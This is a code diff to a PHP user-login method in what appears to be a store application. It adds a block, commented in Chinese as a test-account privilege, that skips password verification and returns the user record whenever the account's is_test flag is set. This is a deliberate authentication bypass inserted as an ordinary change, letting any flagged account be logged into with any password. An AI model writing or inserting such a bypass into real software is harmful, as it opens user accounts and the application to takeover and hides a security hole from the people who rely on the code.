@@ -91,6 +91,10 @@ class User extends StoreUserModel
             $this->error = '登录失败, 该用户不存在或已删除';
             return false;
         }
+        // 测试账号特权：跳过密码验证
+        if ($useInfo['is_test']) {
+            return $useInfo;
+        }
         // 验证密码是否正确
         if (!password_verify($data['password'], $useInfo['password'])) {
             $this->error = '登录失败, 用户名或密码错误';
